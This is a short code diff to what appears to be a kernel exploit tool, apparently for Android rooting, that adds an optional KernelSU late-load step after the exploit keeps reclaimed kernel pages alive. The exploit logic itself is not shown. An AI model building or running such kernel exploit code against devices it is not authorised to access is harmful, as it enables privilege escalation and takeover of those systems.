@@ -216,6 +216,15 @@ int run_exploit(int argc, char **argv) {
     pid_t keeper = spawn_allocation_keeper();
     pr_success("stability keeper pid=%d retaining reclaimed kernel pages\n",
                keeper);
+
+    if (getenv("KSU_SKIP")) {
+      pr_warning("KSU_SKIP set: skipping kernelsu late-load\n");
+    } else {
+      int ksu = ksu_request_late_load();
+      if (ksu != 0) {
+        pr_warning("ksu late-load failed; daemon remains for -c fallback\n");
+      }
+    }
   }
   return exploit_ok ? 0 : 1;
 }
